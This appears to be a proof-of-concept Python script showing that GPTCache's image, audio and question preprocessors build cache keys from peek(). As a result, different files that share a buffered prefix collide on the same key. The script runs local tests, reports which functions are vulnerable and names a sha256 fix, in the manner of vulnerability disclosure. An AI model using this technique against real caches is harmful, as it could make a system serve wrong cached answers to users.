"""
PoC: AC-2 Image Cache Key Collision via peek()

Tests the core vulnerability WITHOUT importing gptcache (avoids dep chain).
We inline the vulnerable functions directly from pre.py.
"""

import io
import hashlib
import struct
import zlib
import os

# ============================================================
# Inline the 3 vulnerable functions from gptcache/processor/pre.py
# ============================================================

def get_input_str(data):
    """pre.py:245-246"""
    input_data = data.get("input")
    return str(input_data["image"].peek()) + input_data["question"]

def get_file_bytes(data):
    """pre.py:229"""
    return data.get("file").peek()

def get_image_question(data):
    """pre.py:280-282"""
    img = data.get("image")
    data_img = str(open(img, "rb").peek()) if isinstance(img, str) else str(img.peek())
    return data_img + data.get("question")

# ============================================================
# Helpers
# ============================================================

def make_png(width, height, rgb_color):
    """Create a minimal valid single-color PNG in memory."""
    def chunk(chunk_type, data):
        c = chunk_type + data
        crc = struct.pack(">I", zlib.crc32(c) & 0xFFFFFFFF)
        return struct.pack(">I", len(data)) + c + crc

    signature = b"\x89PNG\r\n\x1a\n"
    ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    ihdr = chunk(b"IHDR", ihdr_data)
    raw = b""
    for _ in range(height):
        raw += b"\x00" + bytes(rgb_color) * width
    idat = chunk(b"IDAT", zlib.compress(raw))
    iend = chunk(b"IEND", b"")
    return signature + ihdr + idat + iend


print("=" * 60)
print("AC-2 PoC: Image Cache Key Collision via peek()")
print("=" * 60)

question = "What is in this image?"

# --- Test 1: Small JPEG-like streams ---
print("\n[Test 1] Small JPEG-like streams (<= buffer size)")

HEADER_SIZE = 8192
small_a = b"\xff\xd8\xff\xe0" + b"\x00" * (HEADER_SIZE - 4) + b"\xAA" * 100
small_b = b"\xff\xd8\xff\xe0" + b"\x00" * (HEADER_SIZE - 4) + b"\xBB" * 100

sa = io.BufferedReader(io.BytesIO(small_a))
sb = io.BufferedReader(io.BytesIO(small_b))

peek_sa = sa.peek()
peek_sb = sb.peek()

print(f"  stream_a size    : {len(small_a)}")
print(f"  stream_b size    : {len(small_b)}")
print(f"  peek(a) length   : {len(peek_sa)}")
print(f"  peek(b) length   : {len(peek_sb)}")
print(f"  peek equal       : {peek_sa == peek_sb}")
print(f"  full content eq  : {small_a == small_b}")

# Via get_input_str
data_a = {"input": {"image": io.BufferedReader(io.BytesIO(small_a)), "question": question}}
data_b = {"input": {"image": io.BufferedReader(io.BytesIO(small_b)), "question": question}}
key_a = get_input_str(data_a)
key_b = get_input_str(data_b)
print(f"  get_input_str collision: {key_a == key_b}")

# --- Test 2: Large streams (1MB) where peek() is definitely partial ---
print("\n[Test 2] Large JPEG-like streams (1MB) — peek() returns partial")

shared_header = b"\xff\xd8\xff\xe0" + os.urandom(8188)  # 8192 bytes random but shared

large_a = shared_header + b"\xAA" * (1024 * 1024)
large_b = shared_header + b"\xBB" * (1024 * 1024)

la = io.BufferedReader(io.BytesIO(large_a))
lb = io.BufferedReader(io.BytesIO(large_b))

peek_la = la.peek()
peek_lb = lb.peek()

print(f"  total size       : {len(large_a)} bytes")
print(f"  peek(a) length   : {len(peek_la)}")
print(f"  peek(b) length   : {len(peek_lb)}")
print(f"  peek equal       : {peek_la == peek_lb}")
print(f"  full content eq  : {large_a == large_b}")

# get_input_str
data_la = {"input": {"image": io.BufferedReader(io.BytesIO(large_a)), "question": question}}
data_lb = {"input": {"image": io.BufferedReader(io.BytesIO(large_b)), "question": question}}
key_la = get_input_str(data_la)
key_lb = get_input_str(data_lb)
print(f"  get_input_str collision: {key_la == key_lb}")
if key_la == key_lb:
    print("  >>> COLLISION CONFIRMED — different images, same cache key <<<")

# --- Test 3: get_file_bytes ---
print("\n[Test 3] get_file_bytes() collision (OpenAI audio adapter)")

data_fa = {"file": io.BufferedReader(io.BytesIO(large_a))}
data_fb = {"file": io.BufferedReader(io.BytesIO(large_b))}
ba = get_file_bytes(data_fa)
bb = get_file_bytes(data_fb)
print(f"  bytes(a) len: {len(ba)}, bytes(b) len: {len(bb)}")
print(f"  equal: {ba == bb}")
if ba == bb:
    print("  >>> COLLISION CONFIRMED <<<")

# --- Test 4: get_image_question ---
print("\n[Test 4] get_image_question() collision (MiniGPT4 adapter)")

data_qa = {"image": io.BufferedReader(io.BytesIO(large_a)), "question": question}
data_qb = {"image": io.BufferedReader(io.BytesIO(large_b)), "question": question}
kqa = get_image_question(data_qa)
kqb = get_image_question(data_qb)
print(f"  equal: {kqa == kqb}")
if kqa == kqb:
    print("  >>> COLLISION CONFIRMED <<<")

# --- Test 5: Real PNGs ---
print("\n[Test 5] Real valid PNGs — red vs blue, 100x100")

png_red = make_png(100, 100, (255, 0, 0))
png_blue = make_png(100, 100, (0, 0, 255))

pr = io.BufferedReader(io.BytesIO(png_red))
pb = io.BufferedReader(io.BytesIO(png_blue))
print(f"  red size : {len(png_red)}, blue size: {len(png_blue)}")
print(f"  peek equal: {pr.peek() == pb.peek()}")
print(f"  full equal: {png_red == png_blue}")

# --- Test 6: Demonstrate actual peek() semantics ---
print("\n[Test 6] peek() semantics demonstration")

buf = io.BufferedReader(io.BytesIO(b"A" * 100000))
p = buf.peek()
print(f"  100KB stream, peek() returned {len(p)} bytes (buffer size)")
print(f"  peek() returns AT MOST the internal buffer, NOT the full content")

buf2 = io.BufferedReader(io.BytesIO(b"A" * 100), buffer_size=16)
p2 = buf2.peek()
print(f"  100B stream (buf=16), peek() returned {len(p2)} bytes")

# --- Summary ---
print("\n" + "=" * 60)
print("SUMMARY")
print("=" * 60)

results = {
    "get_input_str (small ~8KB)  ": key_a == key_b,
    "get_input_str (large 1MB)   ": key_la == key_lb,
    "get_file_bytes (large 1MB)  ": ba == bb,
    "get_image_question (large)  ": kqa == kqb,
}

for name, collided in results.items():
    status = "\033[91mVULNERABLE\033[0m" if collided else "\033[92mOK\033[0m"
    print(f"  {name}: {status}")

vuln_count = sum(results.values())
print(f"\n  {vuln_count}/{len(results)} vectors confirmed exploitable.")
if vuln_count > 0:
    print("  Root cause: peek() only reads buffered prefix, not full file content.")
    print("  Fix: replace peek() with read() + hash (sha256) of full content.")
